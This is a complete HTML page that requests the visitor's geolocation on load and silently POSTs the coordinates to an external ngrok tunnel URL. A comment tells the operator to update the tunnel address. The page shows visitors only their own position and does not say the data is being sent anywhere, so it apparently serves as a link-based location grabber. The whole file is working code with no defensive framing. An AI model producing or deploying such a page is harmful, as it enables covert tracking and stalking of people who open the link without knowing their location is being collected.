<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access</title>
    <script>
        function sendLocation(latitude, longitude) {
            fetch("https://87e3-103-26-86-197.ngrok-free.app", {  // Replace with your latest Ngrok URL
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ latitude, longitude })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Server response:", data);
                document.getElementById("location").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
            })
            .catch(error => {
                console.error("Error:", error);
                document.getElementById("location").innerText = "Failed to send location.";
            });
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        sendLocation(position.coords.latitude, position.coords.longitude);
                    },
                    (error) => {
                        console.error("Error getting location:", error);
                        document.getElementById("location").innerText = "Location access denied.";
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }
    </script>
</head>
<body onload="requestLocation()">
    <h2>Your Location:</h2>
    <p id="location">Fetching...</p>
</body>
</html>
